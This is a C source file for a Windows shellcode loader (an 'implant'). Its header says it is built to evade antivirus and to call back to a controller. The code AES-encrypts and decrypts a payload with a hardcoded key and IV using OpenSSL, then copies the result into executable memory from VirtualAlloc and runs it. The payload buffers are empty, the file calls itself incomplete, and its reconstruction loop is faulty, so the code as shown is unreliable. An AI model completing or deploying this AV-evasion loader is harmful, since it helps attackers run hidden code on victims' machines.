/*
 * This code is not complete!
 * Payloads must be freshly generated, padded to be divisible by 16, encrypted, and then removed from the program.
 * Once working, this implant will decrypt a payload at runtime to callback to the controller; 
 * Encryption is done with AES256; the key and IV are hardcoded as this is designed to evade AV, not an analyst.
 * */

#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>
#include <windows.h>

//unsigned char NPAYLOAD[] =  "";


unsigned char ENCRYPTEDDAOLYAP[] = "";

void handleErrors(void);
int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
            unsigned char *iv, unsigned char *ciphertext);
int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
            unsigned char *iv, unsigned char *plaintext);

int main (void)
{

    /* A 256 bit key */
    unsigned char *key = (unsigned char *) "MbQeThWmZq4t6w9zMbQeThWmZq4t6w9z";				// "01234567890123456789012345678901";

    /* A 128 bit IV */
    unsigned char *iv = (unsigned char *) "kkkjjjhhhyyyttti";					// "0123456789012345";

    /* Message to be encrypted */
    unsigned char *plaintext =
        (unsigned char *) "";


/* unsigned char *plaintext = (unsigned char *) "";
*/

    unsigned char ciphertext[2000];

    /* Buffer for the decrypted text */
    unsigned char decryptedtext[2000];

    int decryptedtext_len, ciphertext_len;

    /* Encrypt the plaintext */								// Encrypting the payload
    ciphertext_len = encrypt (plaintext, strlen ((char *)plaintext), key, iv,
                              ciphertext);

    // printf("Ciphertext is:\n");
    // BIO_dump_fp (stdout, (const char *)ciphertext, ciphertext_len);

    printf("-----Formatted Ciphertext-----\n");
    
    for (int i = 0; i < ciphertext_len; i++) {
	printf("\\x%x", ciphertext[i]);
    }

    printf("\n-----Raw plaintext-----\n");

    for (int i = 0; plaintext[i] != '\0'; i++) {
        printf("\\x%x", plaintext[i]);
    }

    // BIO_dump_fp(stdout, (const char *)plaintext, ciphertext_len);
    
    /* Decrypt the ciphertext */						// This is the evasion string
    decryptedtext_len = decrypt(ciphertext, ciphertext_len, key, iv,
                                decryptedtext);

    /* Add a NULL terminator. We are expecting printable text */
    decryptedtext[decryptedtext_len] = '\0';

    printf("\n-----Decrypted Ciphertext-----\n");
    
    for (int i = 0; i < decryptedtext_len; i++) {
    	printf("\\x%x", decryptedtext[i]);					// decryptedtext contains the actual payload; this is proof that we can access it after decryption
    }

/*    for (int i = 0; plaintext[i] != '\0'; i++) {
        printf("%x", plaintext[i]);
    } */

    unsigned char reconstructed[2000];
    
    for (int i = 0; i < decryptedtext_len; i++) {
    	sprintf(reconstructed, "\\x%x", decryptedtext[i]);
    }    

    void *exec = VirtualAlloc(0, sizeof reconstructed, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, reconstructed, sizeof reconstructed);
    ((void(*)())exec)();
    return 0;

}

void handleErrors(void)
{
    ERR_print_errors_fp(stderr);
    abort();
}

int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
            unsigned char *iv, unsigned char *ciphertext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int ciphertext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the encryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be encrypted, and obtain the encrypted output.
     * EVP_EncryptUpdate can be called multiple times if necessary
     */
    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handleErrors();
    ciphertext_len = len;

    /*
     * Finalise the encryption. Further ciphertext bytes may be written at
     * this stage.
     */
    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
        handleErrors();
    ciphertext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}


int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
            unsigned char *iv, unsigned char *plaintext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int plaintext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the decryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be decrypted, and obtain the plaintext output.
     * EVP_DecryptUpdate can be called multiple times if necessary.
     */
    if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;

    /*
     * Finalise the decryption. Further plaintext bytes may be written at
     * this stage.
     */
    if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
        handleErrors();
    plaintext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;
}
